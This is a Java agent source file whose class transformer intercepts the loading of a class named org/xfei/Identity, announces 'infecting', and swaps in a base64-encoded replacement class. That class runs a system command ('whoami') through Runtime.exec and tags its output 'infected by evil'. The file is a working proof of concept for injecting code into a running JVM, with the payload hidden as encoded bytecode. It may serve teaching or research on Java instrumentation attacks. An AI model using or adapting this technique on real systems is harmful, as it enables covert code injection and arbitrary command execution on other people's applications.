package org.xfei.agent;

import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.security.ProtectionDomain;
import java.util.Arrays;

public class Transformer implements ClassFileTransformer{
	 static byte[] mergeByteArray(byte[]... byteArray) {
	       int totalLength = 0;
	       for(int i = 0; i < byteArray.length; i ++) {
	           if(byteArray[i] == null) {
	               continue;
	           }
	           totalLength += byteArray[i].length;
	       }
	       byte[] result = new byte[totalLength];
	       int cur = 0;
	       for(int i = 0; i < byteArray.length; i++) {
	           if(byteArray[i] == null) {
	               continue;
	           }
	           System.arraycopy(byteArray[i], 0, result, cur, byteArray[i].length);
	           cur += byteArray[i].length;
	       }
	       return result;
	   }
	   public static byte[] getBytesFromFile(String fileName) { 
	       try { 
	           byte[] result=new byte[] {};
	           InputStream is = new FileInputStream(new File(fileName)); 
	           byte[] bytes = new byte[1024];
	           int num = 0;
	           while ((num = is.read(bytes)) != -1) {
	               result=mergeByteArray(result,Arrays.copyOfRange(bytes, 0, num));       
	           }
	           is.close();
	           return result; 
	       } catch (Exception e) { 
	           e.printStackTrace();
	           return null;
	       } 
	   } 
	   public byte[] transform(ClassLoader classLoader, String className, Class<?> c, 
	           ProtectionDomain pd, byte[] b) throws IllegalClassFormatException { 
	       if (!className.equals("org/xfei/Identity")) { 
	           return null; 
	       } 
	       System.out.println("Class found, infecting....."); 
//	       byte[] code=getBytesFromFile("Identity.class");    
//	       String encoded=encodeBase64(code);
//	       System.out.println("code: "+encoded); 
	       String base64code="yv66vgAAADMAZQcAAgEAEW9yZy94ZmVpL0lkZW50aXR5BwAEAQAQamF2YS9sYW5nL09iamVjdAEABjxpbml0PgEAAygpVgEABENvZGUKAAMACQwABQAGAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE0xvcmcveGZlaS9JZGVudGl0eTsBAA1wcmludElkZW50aXR5AQAKRXhjZXB0aW9ucwcAEQEAE2phdmEvaW8vSU9FeGNlcHRpb24KABMAFQcAFAEAEWphdmEvbGFuZy9SdW50aW1lDAAWABcBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7BwAZAQAQamF2YS9sYW5nL1N0cmluZwgAGwEABndob2FtaQoAEwAdDAAeAB8BAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwoAIQAjBwAiAQARamF2YS9sYW5nL1Byb2Nlc3MMACQAJQEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsHACcBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyCgAmACkMAAUAKgEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgcALAEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIKACsALgwABQAvAQATKExqYXZhL2lvL1JlYWRlcjspVgkAMQAzBwAyAQAQamF2YS9sYW5nL1N5c3RlbQwANAA1AQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07BwA3AQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIKABgAOQwAOgA7AQAHdmFsdWVPZgEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9TdHJpbmc7CgA2AD0MAAUAPgEAFShMamF2YS9sYW5nL1N0cmluZzspVggAQAEAEiBpbmZlY3RlZCBieSBldmlsIQoANgBCDABDAEQBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsKADYARgwARwBIAQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwoASgBMBwBLAQATamF2YS9pby9QcmludFN0cmVhbQwATQA+AQAHcHJpbnRsbgoAKwBPDABQAEgBAAhyZWFkTGluZQEAAnJ0AQATTGphdmEvbGFuZy9SdW50aW1lOwEACGNvbW1hbmRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABHByb2MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAFc3RkaW4BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAANpc3IBABtMamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcjsBAAJicgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBABJMamF2YS9sYW5nL1N0cmluZzsBAA1TdGFja01hcFRhYmxlBwBUBwBiAQATamF2YS9pby9JbnB1dFN0cmVhbQEAClNvdXJjZUZpbGUBAA1JZGVudGl0eS5qYXZhACEAAQADAAAAAAACAAEABQAGAAEABwAAAC8AAQABAAAABSq3AAixAAAAAgAKAAAABgABAAAACAALAAAADAABAAAABQAMAA0AAAABAA4ABgACAA8AAAAEAAEAEAAHAAABHAAEAAgAAABcuAASTAS9ABhZAxIaU00rLLYAHE4ttgAgOgS7ACZZGQS3ACg6BbsAK1kZBbcALToGAToHpwAdsgAwuwA2WRkHuAA4twA8Ej+2AEG2AEW2AEkZBrYATlk6B8f/3rEAAAADAAoAAAAuAAsAAAALAAQADAAOAA4AFAAQABoAEQAlABIAMAAUADMAFgA2ABcAUAAWAFsAGgALAAAAUgAIAAAAXAAMAA0AAAAEAFgAUQBSAAEADgBOAFMAVAACABQASABVAFYAAwAaAEIAVwBYAAQAJQA3AFkAWgAFADAALABbAFwABgAzACkAXQBeAAcAXwAAACIAAv8ANgAIBwABBwATBwBgBwAhBwBhBwAmBwArBwAYAAAZAAEAYwAAAAIAZA==";
	       return decodeBase64(base64code); 
	   } 
	   
	   public static String encodeBase64(byte[]input){  
	        Class clazz;
			try {
				clazz = Class.forName("com.sun.org.apache.xerces.internal.impl.dv.util.Base64");
		        Method mainMethod= clazz.getMethod("encode", byte[].class);  
		        mainMethod.setAccessible(true);  
		         Object retObj=mainMethod.invoke(null, new Object[]{input});  
		         return (String)retObj;  
			} catch (ClassNotFoundException | NoSuchMethodException | SecurityException | IllegalAccessException | IllegalArgumentException | InvocationTargetException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}  
			return null;
	    }  
	    /*** 
	     * decode by Base64 
	     */  
	    public static byte[] decodeBase64(String input){  
	        Class clazz;
			try {
				clazz = Class.forName("com.sun.org.apache.xerces.internal.impl.dv.util.Base64");
		        Method mainMethod= clazz.getMethod("decode", String.class);  
		        mainMethod.setAccessible(true);  
		         Object retObj=mainMethod.invoke(null, input);  
		         return (byte[])retObj;  
			} catch (ClassNotFoundException | NoSuchMethodException | SecurityException | IllegalAccessException | IllegalArgumentException | InvocationTargetException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}  
			return null;
	    }  
}
